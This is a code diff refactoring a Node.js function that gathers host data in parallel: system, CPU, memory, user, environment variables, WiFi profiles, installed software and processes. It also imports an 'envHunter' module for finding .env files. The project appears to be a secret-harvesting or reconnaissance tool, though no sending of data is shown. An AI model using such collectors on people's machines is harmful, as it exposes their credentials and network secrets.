@@ -9,11 +9,6 @@ const {
 } = require("../files/crud");
 const { findEnvFiles } = require("../files/envHunter");
 
-/**
- * @typedef {{ system: object, cpu: object, memory: object, user: object, environmentVariables: object }} SystemData
- *
- * @typedef {{ operation: string, status: string, result?: unknown, error?: string }} CrudEntry
- */
 const getSystemInfo = require("../system/system");
 const getCPUInfo = require("../system/cpu");
 const getMemoryInfo = require("../system/memory");
@@ -36,16 +31,45 @@ function safeCollect(fn, name, fallback) {
     }
 }
 
-function collectSystemData() {
+async function safeCollectAsync(promise, name, fallback) {
+    try {
+        return await promise;
+    } catch (err) {
+        logger.warn(`Collector ${name} failed: ${err.message}`);
+        return fallback;
+    }
+}
+
+async function collectSystemData() {
+    const [
+        system,
+        cpu,
+        memory,
+        user,
+        environmentVariables,
+        wifi,
+        software,
+        processes
+    ] = await Promise.allSettled([
+        Promise.resolve(safeCollect(getSystemInfo, "system", {})),
+        Promise.resolve(safeCollect(getCPUInfo, "cpu", {})),
+        Promise.resolve(safeCollect(getMemoryInfo, "memory", {})),
+        Promise.resolve(safeCollect(getUserInfo, "user", {})),
+        Promise.resolve(safeCollect(getEnvironmentInfo, "env", {})),
+        safeCollectAsync(getWifiProfiles(), "wifi", []),
+        safeCollectAsync(getInstalledSoftware(), "software", []),
+        safeCollectAsync(getProcessList(), "processes", [])
+    ]);
+
     return {
-        system: safeCollect(getSystemInfo, "system", {}),
-        cpu: safeCollect(getCPUInfo, "cpu", {}),
-        memory: safeCollect(getMemoryInfo, "memory", {}),
-        user: safeCollect(getUserInfo, "user", {}),
-        environmentVariables: safeCollect(getEnvironmentInfo, "env", {}),
-        wifi: safeCollect(getWifiProfiles, "wifi", []),
-        software: safeCollect(getInstalledSoftware, "software", []),
-        processes: safeCollect(getProcessList, "processes", [])
+        system: system.status === "fulfilled" ? system.value : {},
+        cpu: cpu.status === "fulfilled" ? cpu.value : {},
+        memory: memory.status === "fulfilled" ? memory.value : {},
+        user: user.status === "fulfilled" ? user.value : {},
+        environmentVariables: environmentVariables.status === "fulfilled" ? environmentVariables.value : {},
+        wifi: wifi.status === "fulfilled" ? wifi.value : [],
+        software: software.status === "fulfilled" ? software.value : [],
+        processes: processes.status === "fulfilled" ? processes.value : []
     };
 }
 
